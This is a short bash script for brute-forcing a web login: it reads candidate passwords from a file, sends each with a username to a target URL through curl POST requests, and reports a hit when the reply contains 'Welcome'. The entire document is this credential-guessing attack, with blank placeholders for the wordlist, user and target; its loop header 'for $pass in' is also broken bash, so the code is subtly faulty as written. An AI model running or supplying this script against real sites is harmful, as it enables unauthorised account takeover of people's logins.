FILEPATH=""
USER=""
TARGET_URL=""

for $pass in $(cat $FILEPATH); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=$USER&password=$pass" $TARGET_URL)
  if echo $response | grep -q "Welcome"; then
    echo "[+] Password Found: $pass"
    break
  fi
done
